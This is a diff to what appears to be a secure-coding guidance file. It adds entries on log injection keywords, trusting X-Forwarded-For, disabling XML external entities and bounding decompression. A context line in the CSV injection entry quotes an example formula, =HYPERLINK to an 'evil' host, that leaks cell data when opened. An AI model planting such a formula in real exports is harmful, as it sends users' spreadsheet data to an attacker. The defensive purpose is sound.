@@ -80,7 +80,7 @@ Never invent cryptography. Use high-level libraries (libsodium, Tink, the platfo
 
 ## security-logging: Log security events without logging secrets
 tags: security, logging, audit log, monitoring, authentication events, incident response
-keywords: no record of who did what
+keywords: no record of who did what, audit trail, siem, login attempts, log injection, log forging, newline in username
 refs: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
 
 Record authentication successes and failures, authorization denials, privilege changes and administrative actions with who, what, when and from where, in tamper-resistant storage. Exclude passwords, tokens, session IDs and unnecessary personal data, and neutralize newlines in logged user input to prevent log injection.
@@ -112,3 +112,24 @@ keywords: export to csv, open in excel, download report
 refs: https://owasp.org/www-community/attacks/CSV_Injection
 
 Spreadsheet programs evaluate a cell that starts with `=`, `+`, `-`, `@`, a tab or a carriage return as a formula, so a user-controlled value such as `=HYPERLINK("http://evil/?"&A1,"Click")` runs when finance opens the export. Prefix such text cells with a single quote (`'`), and write rows with a CSV library (`csv.writer`, not string joins) so commas, quotes and newlines are quoted. Apply it to every field a user can influence, not only names.
+
+## client-ip-behind-proxies: Derive the client IP from trusted proxy headers only
+tags: security, x forwarded for, client ip, proxy, load balancer, rate limiting, spoofing
+keywords: rate limit bypassed with a header, req.ip is the load balancer
+refs: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For#security_and_privacy_concerns
+
+`X-Forwarded-For` is a client-writable list: anything left of what your own proxies appended is attacker-controlled. Configure the number of trusted proxy hops (or their addresses) and take the address that hop count from the right; never use the leftmost value for rate limiting, audit logs or allowlists.
+
+## xml-external-entities: Disable external entities and DTDs when parsing XML
+tags: security, xxe, xml, external entities, dtd, parser configuration, ssrf
+keywords: parsing uploaded xml, SAML, SVG uploads
+refs: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+
+XML parsers that resolve external entities can read local files or make server-side requests from a crafted document (XXE), and entity expansion can exhaust memory. Disable DTDs and external entities in the parser configuration, or use hardened parsers (Python `defusedxml`), for every XML input, including SVG, SAML and office documents.
+
+## decompression-limits: Bound decompressed size and file counts for uploads and archives
+tags: security, zip bomb, decompression bomb, gzip, archive, denial of service, limits
+keywords: small upload filled the disk
+refs: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
+
+A few kilobytes of compressed data can expand to gigabytes. When decompressing uploads (zip, gzip request bodies, images), stream with a running byte counter and abort above a limit, cap the number of archive entries and nesting depth, and check declared sizes without trusting them.
